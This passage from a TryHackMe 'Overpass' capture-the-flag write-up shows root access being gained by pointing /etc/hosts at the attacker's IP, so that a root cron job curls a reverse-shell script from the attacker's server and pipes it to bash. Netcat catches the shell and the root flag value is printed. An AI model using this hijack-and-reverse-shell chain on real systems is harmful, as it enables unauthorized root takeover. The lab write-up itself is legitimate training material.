fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@ip-10-66-180-249:~$ vi /etc/hosts
james@ip-10-66-180-249:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
192.168.157.156 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@ip-10-66-180-249:~$ 
```

Gaining Root Access: Check the **python server** on the attacker machine for the request from the target.

Upon the next minute cycle, the root cron job executes:
1. **Resolution:** The system looks up `overpass.thm` and resolves it to the **attacker's IP** (`192.168.157.156`).
2. **Download:** `curl` connects to the attacker's web server (Port 80), downloading the malicious reverse shell payload (`buildscript.sh`).
3. **Execution:** The payload is piped to `bash` and executed as **`root`**.

Web Server Confirmation: The attacker's Python server confirms the request came from the target machine's IP (`10.66.180.249`).

```shell
─(kali㉿kali)-[~/CS/THM/Overpass]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.66.180.249 - - [03/Dec/2025 06:56:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

Reverse Shell Confirmation: The netcat listener receives the connection, granting a shell with **root** privileges.

```shell
┌──(kali㉿kali)-[~/CS/THM/Overpass]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.157.156] from (UNKNOWN) [10.66.180.249] 45632
bash: cannot set terminal process group (2111): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-66-180-249:~# 
```

The root flag is located in the standard root home directory.

```shell
root@ip-10-66-180-249:~# hostname ; whoami ; ip a
hostname ; whoami ; ip a
ip-10-66-180-249
root
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:85:fc:e9:41:5d brd ff:ff:ff:ff:ff:ff
    inet 10.66.180.249/18 metric 100 brd 10.66.191.255 scope global dynamic eth0
       valid_lft 3079sec preferred_lft 3079sec
    inet6 fe80::85:fcff:fee9:415d/64 scope link 
       valid_lft forever preferred_lft forever
root@ip-10-66-180-249:~# pwd
pwd
/root
root@ip-10-66-180-249:~# ls
ls
buildStatus
builds
go
root.txt
src
root@ip-10-66-180-249:~# cat root.txt   
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
root@ip-10-66-180-249:~#
```

AND THIS IS THE PART WHERE OMBACHI WOULD SAY DONE!🍳
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

